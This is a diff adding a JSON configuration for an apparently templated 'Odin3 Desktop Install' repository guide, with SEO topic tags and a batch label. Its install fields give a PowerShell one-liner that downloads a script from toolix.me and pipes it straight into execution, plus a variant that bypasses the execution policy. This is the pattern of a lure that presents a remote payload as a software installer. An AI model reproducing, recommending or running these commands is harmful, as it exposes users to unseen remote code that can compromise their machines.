@@ -1,0 +1,26 @@
+{
+  "repo": "Odin3-Desktop-Install",
+  "product": "Odin3 Desktop Install",
+  "product_title": "Odin3 Desktop Install",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-odin3-desktop-install",
+    "odin3-desktop-install-app",
+    "install-guide",
+    "desktop-software",
+    "repository-readme",
+    "odin3-desktop-install-desktop-tool",
+    "odin3-desktop-install-windows-tool",
+    "odin3-desktop-install",
+    "windows-11",
+    "windows-desktop"
+  ],
+  "site": "toolix.me"
+}
